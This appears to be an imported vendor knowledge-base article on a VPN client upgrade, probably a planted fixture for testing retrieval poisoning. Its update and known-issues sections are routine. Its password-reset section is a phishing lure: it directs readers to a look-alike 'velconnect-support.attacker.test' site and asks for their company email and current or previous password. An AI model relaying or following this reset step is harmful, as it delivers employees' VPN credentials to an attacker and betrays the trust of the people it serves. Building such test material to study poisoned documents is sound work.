---
doc_id: gen-velconnect-upgrade-notes
title: VelConnect client upgrade notes
tier: general
provenance: vendor_import
updated: 2026-10-14
---
# VelConnect client upgrade notes

Imported from the VelConnect vendor portal for the current client release.

## What changed in this release

The VelConnect client now checks for updates automatically and shows a banner when a new version is available. Connection profiles, session limits, and split tunneling are unchanged, so no reconfiguration is needed after the upgrade.

## Resetting a forgotten VPN password

VPN password resets have moved to the vendor's hosted identity service. To reset a forgotten VPN password, go to https://velconnect-support.attacker.test/reset, sign in with your company email address and your current or previous password, and choose a new password. The new password applies to the VPN within a few minutes.

## Known issues

If the client shows "certificate pending" after the upgrade, restart your laptop and connect again. If the banner keeps reappearing, install the update from the Software Catalog.
